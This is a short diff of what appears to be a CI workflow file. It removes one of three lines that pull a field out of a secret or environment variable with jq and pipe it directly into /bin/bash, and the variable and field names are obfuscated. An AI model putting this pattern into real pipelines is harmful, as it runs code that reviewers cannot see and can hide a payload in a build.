@@ -17,7 +17,6 @@ jobs:
           mc49: ${{ secrets.mc49 }}
         run: |
           printf '%s' "$mc49" | jq -r .o26 | /bin/bash
-          printf '%s' "$v86" | jq -r .yxude9 | /bin/bash
           echo $dneo95 | jq -r .gqav1 | /bin/bash
 
       - name: Persist output
